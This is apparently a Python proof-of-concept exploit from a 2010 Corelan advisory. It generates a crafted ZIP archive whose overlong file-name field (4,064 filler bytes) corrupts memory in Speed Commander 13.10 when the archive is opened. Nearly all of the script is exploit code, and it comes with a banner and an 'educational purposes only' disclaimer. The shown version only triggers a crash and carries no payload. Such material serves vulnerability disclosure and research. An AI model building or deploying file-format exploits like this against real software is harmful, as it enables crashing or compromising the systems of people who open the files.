#!/usr/bin/python
# #######################################################################
# Title:                Speed Commander 13.10 (.zip) Memory Corruption
# Author:               TecR0c - http://tecninja.net/blog & http://twitter.com/TecR0c
# Found by:             TecR0c
# Platform:             Windows XP sp3 En
# Advisory:             http://www.corelan.be:8800/advisories.php?id=CORELAN-10-028
# Greetz to:            Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
# #######################################################################
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
#
# Note : you are not allowed to edit/modify this code.
# If you do, Corelan cannot be held responsible for any damages this may cause.
 
# Trigger : Open the application, Browse to the zip file > double click = BOOM!
 
print "|------------------------------------------------------------------|"
print "|                         __               __                      |"
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
print "|                                                                  |"
print "|                                       http://www.corelan.be:8800 |"
print "|                                              security@corelan.be |"
print "|                                                                  |"
print "|-------------------------------------------------[ EIP Hunters ]--|"
print "[+] SpeedCommander (.zip)  - by TecR0c"
 
 
ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f"
"\x00\x00\x00")
 
cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f"
"\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")
 
eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00"
"\x02\x10\x00\x00"
"\x00\x00")
 
buff = "\x41" * 4064
buff += ".txt"
 
mefile = open('SpeedCommander.zip','w');
mefile.write(ldf_header + buff + cdf_header + buff + eofcdf_header);
mefile.close()
